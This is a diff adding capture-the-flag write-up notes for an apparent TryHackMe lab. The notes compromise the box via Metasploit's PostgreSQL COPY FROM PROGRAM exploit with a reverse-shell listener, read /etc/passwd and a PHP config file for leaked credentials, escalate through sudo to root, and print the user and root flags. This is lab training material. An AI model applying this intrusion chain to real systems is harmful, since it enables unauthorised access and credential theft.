@@ -314,7 +314,119 @@ Matching Modules
    5   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
    6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
 ```
+# Compromise the machine and locate user.txt
+using exploit/multi/postgres/postgres_copy_from_program_cmd_exec 
+set username to postgres
+set password to password
+set lhost to tun0
+following command to search system for user.txt and send 'permission denied' to garbage
+```bash
+find / -name user.txt 2>/dev/null
+```
+cat /etc/passwd reveals users Alison and Dark
+Alison has user.txt in their home dir but permission denied to postgres user
+Dark has credentials.txt in their home dir with contents qwerty1234#!hackme
+su dark:qwerty1234#!hackme
 
+sudo -l no root permissions
+
+enumerating what dark has access to
+find / -user dark 2>/dev/null find | grep -v '/proc'
+
+```bash
+dark@ubuntu:~$ find / -user dark 2>/dev/null | grep -v '/proc'
+find / -user dark 2>/dev/null | grep -v '/proc'
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/tasks
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/cgroup.procs
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope/tasks
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.clone_children
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope/notify_on_release
+/home/dark
+/home/dark/.bashrc
+/home/dark/.bash_logout
+/home/dark/.profile
+/home/dark/.bash_history
+/home/dark/credentials.txt
+/run/user/1001
+/run/user/1001/systemd
+/run/user/1001/systemd/private
+/run/user/1001/systemd/notify
+```
+find / -group dark 2>/dev/null
+```bash
+dark@ubuntu:~$ find / -group dark 2>/dev/null | grep -v '/proc'
+find / -group dark 2>/dev/null | grep -v '/proc'
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/tasks
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/cgroup.procs
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope/tasks
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.clone_children
+/sys/fs/cgroup/systemd/user.slice/user-1001.slice/user@1001.service/init.scope/notify_on_release
+/home/dark
+/home/dark/.bashrc
+/home/dark/.bash_logout
+/home/dark/.profile
+/home/dark/.bash_history
+/home/dark/credentials.txt
+/run/user/1001
+/run/user/1001/systemd
+/run/user/1001/systemd/private
+/run/user/1001/systemd/notify
+
+```
+
+```bash
+ark@ubuntu:/var/lib/postgresql$ cat /var/www/html/config.php
+cat /var/www/html/config.php
+<?php 
+
+        $dbhost = "127.0.0.1";
+        $dbuname = "alison";
+        $dbpass = "p4ssw0rdS3cur3!#";
+        $dbname = "mysudopassword";
+```
+
+```bash
+alison@ubuntu:/var/lib/postgresql$ cat /home/alison/user.txt
+cat /home/alison/user.txt
+THM{postgresql_fa1l_conf1gurat1on}
+```
+
+```bash
+alison@ubuntu:/var/lib/postgresql$ sudo -l 
+sudo -l
+[sudo] password for alison: p4ssw0rdS3cur3!#
+
+Matching Defaults entries for alison on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alison may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+
+alison@ubuntu:/$ sudo su
+sudo su
+root@ubuntu:/#
+root@ubuntu:/# cd root
+cd root
+root@ubuntu:~# ls -aslp
+ls -aslp
+total 24
+4 drwx------  3 root root 4096 Jul 28  2020 ./
+4 drwxr-xr-x 22 root root 4096 Jul 28  2020 ../
+4 -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+4 drwxr-xr-x  2 root root 4096 Jul 28  2020 .nano/
+4 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
+4 -rw-r--r--  1 root root   49 Jul 28  2020 root.txt
+root@ubuntu:~# cat root.txt
+cat root.txt
+THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
+```
 
 
 
